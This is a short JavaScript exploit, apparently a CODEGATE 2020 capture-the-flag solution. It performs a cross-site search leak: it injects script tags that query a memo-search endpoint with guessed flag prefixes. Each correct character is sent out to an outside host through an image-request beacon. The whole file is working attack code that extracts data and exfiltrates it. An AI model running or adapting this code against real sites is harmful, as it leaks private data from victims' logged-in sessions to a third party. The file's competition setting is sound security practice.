function msg(data) {
    x = new Image();
    // x.src="https://pass.imjuno.com/a?x="+encodeURIComponent(btoa(data));
    x.src="https://pass.imjuno.com/a?x="+encodeURIComponent(data);
}

msg("hello");

charset22 = `0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_{|}~ \t\n\r\x0b\x0c`;

script = {}
for (var i=0; i<charset22.length; i++) {
    script[i] = document.createElement('script');
    script[i].juno = charset22[i];
    script[i].src = "http://110.10.147.157:5000/api/memosearch.jsp?keyword=" + escape("CODEGATE2020{XS_L2AK" + charset22[i]);
    script[i].onerror = function() {
        // msg("B" + this.juno);
    };
    script[i].onload = function() {
        msg("goooooood" + this.juno);
    };

    document.head.append(script[i]);
}
